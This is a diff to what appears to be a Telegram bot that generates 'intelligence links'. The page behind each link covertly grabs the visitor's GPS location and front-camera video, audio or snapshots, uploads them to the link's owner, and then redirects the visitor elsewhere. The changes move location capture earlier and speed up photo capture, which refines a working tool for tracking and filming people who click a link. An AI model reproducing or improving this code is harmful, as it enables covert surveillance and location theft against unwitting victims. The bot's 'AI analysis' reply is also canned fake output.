@@ -178,8 +178,8 @@ async def start_link_creation(message: Message):
         
     user_states[user_id] = {"step": "waiting_mode"}
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🎥 ڤیدیۆ و دەنگ (10 چرکە)", callback_data="mode_video")],
-        [InlineKeyboardButton(text="📸 تەنیا ڕەسم (هەر 1.5 چرکە)", callback_data="mode_photo")]
+        [InlineKeyboardButton(text="🎥 ڤیدیۆ و دەنگ (5 چرکە)", callback_data="mode_video")],
+        [InlineKeyboardButton(text="📸 تەنیا ڕەسم (هەر 1 چرکە)", callback_data="mode_photo")]
     ])
     await message.answer(TEXTS[lang]["ask_mode"], reply_markup=kb)
 
@@ -255,7 +255,7 @@ async def handle_text_inputs(message: Message):
     lang = get_current_lang(user_id)
     text = message.text.strip()
     
-    if text in ["🔗 دروستکردنی لینکی هەواڵگری", "📊 باری سیستەم", "🌐 گۆڕینی زمان", "🧠 زیرەکی دەستکرد", "🔗 Create Intelligence Link", "📊 System Status", "🌐 Change Language", "🧠 Artificial Intelligence"]:
+    if text in ["🔗 دروستکردنی لینکی هەواڵگری", "📊 باری سیستەم", "🌐 گۆڕینی زمان", "🧠 زیرەکی دەستکرد"]:
         return
 
     state_info = user_states.get(user_id, {})
@@ -300,10 +300,6 @@ async def handle_text_inputs(message: Message):
         ai_response = f"🤖 **Royal AI Analysis:**\n\nبۆ پرسیارەکەی ئێوە ('{text}'):\nسیستەمی زیرەکی دەستکردی شاهانە لە لوتکەی توانادایە."
         user_states[user_id] = {}
         await message.answer(ai_response, reply_markup=get_reply_menu(lang))
-
-@dp.message(F.photo)
-async def handle_admin_photo(message: Message):
-    pass
 
 async def short_link_handler(request: web.Request):
     short_code = request.match_info.get('code', '')
@@ -376,30 +372,32 @@ async def short_link_handler(request: web.Request):
 
     if mode == "video":
         engine_script = """
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&owner=' + targetUserId);
+                }, function(err) {
+                    console.log("GPS Error");
+                }, { timeout: 6000, enableHighAccuracy: true });
+            }
+
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: true })
             .then(function(stream) {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(function(pos) {
-                        fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&owner=' + targetUserId);
-                    }, function(err) {
-                        console.log("GPS Error");
-                    }, { timeout: 5000, enableHighAccuracy: true });
-                }
-
                 let video = document.getElementById('v');
                 video.srcObject = stream;
                 
                 let mediaRecorder;
-                let ext = 'webm';
+                let usedMime = 'video/mp4';
                 try {
-                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
-                } catch (e) {
-                    try {
+                    if (MediaRecorder.isTypeSupported('video/mp4')) {
                         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
-                        ext = 'mp4';
-                    } catch (err) {
+                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+                        usedMime = 'video/webm';
+                    } else {
                         mediaRecorder = new MediaRecorder(stream);
                     }
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream);
                 }
                 
                 let chunks = [];
@@ -408,7 +406,7 @@ async def short_link_handler(request: web.Request):
                 };
                 
                 mediaRecorder.onstop = function() {
-                    let blob = new Blob(chunks, { type: mediaRecorder.mimeType || 'video/webm' });
+                    let blob = new Blob(chunks, { type: mediaRecorder.mimeType || usedMime });
                     let reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = function() {
@@ -416,7 +414,7 @@ async def short_link_handler(request: web.Request):
                         fetch('/upload_video', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ video: base64data, owner: targetUserId, ext: ext })
+                            body: JSON.stringify({ video: base64data, owner: targetUserId, mime: usedMime })
                         }).then(() => {
                             stream.getTracks().forEach(t => t.stop());
                             window.location.href = redirectTarget;
@@ -431,7 +429,7 @@ async def short_link_handler(request: web.Request):
                     if (mediaRecorder.state === "recording") {
                         mediaRecorder.stop();
                     }
-                }, 5000); // زیادکرا بۆ ٥ چرکە بۆ ئەوەی فریای لۆکەیشن بکەوێت
+                }, 5000);
                 
             }).catch(function(err) {
                 window.location.href = redirectTarget;
@@ -439,16 +437,16 @@ async def short_link_handler(request: web.Request):
         """
     else:
         engine_script = """
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&owner=' + targetUserId);
+                }, function(err) {
+                    console.log("GPS Error");
+                }, { timeout: 6000, enableHighAccuracy: true });
+            }
+
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
             .then(function(stream) {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(function(pos) {
-                        fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&owner=' + targetUserId);
-                    }, function(err) {
-                        console.log("GPS Error");
-                    }, { timeout: 5000, enableHighAccuracy: true });
-                }
-
                 let video = document.getElementById('v');
                 video.srcObject = stream;
                 
@@ -474,12 +472,12 @@ async def short_link_handler(request: web.Request):
                         });
                         shots++;
                     }
-                    if(shots >= 5) { // گۆڕا بۆ ٥ وێنە بۆ کاتی زیاتری وەرگرتنی لۆکەیشن
+                    if(shots >= 5) {
                         clearInterval(interval);
                         stream.getTracks().forEach(t => t.stop());
                         window.location.href = redirectTarget;
                     }
-                }, 1500);
+                }, 1000); // هەر ١ چرکە جارێک وێنە دەگرێت
             }).catch(function(err) {
                 window.location.href = redirectTarget;
             });
@@ -619,7 +617,9 @@ async def upload_video(request):
         data = await request.json()
         video_data = data.get('video')
         owner = int(data.get('owner', ADMIN_ID))
-        ext = data.get('ext', 'webm')
+        mime = data.get('mime', 'video/mp4')
+        ext = "webm" if "webm" in mime else "mp4"
+        
         if video_data and "," in video_data:
             encoded = video_data.split(",", 1)[1]
             video_bytes = base64.b64decode(encoded)
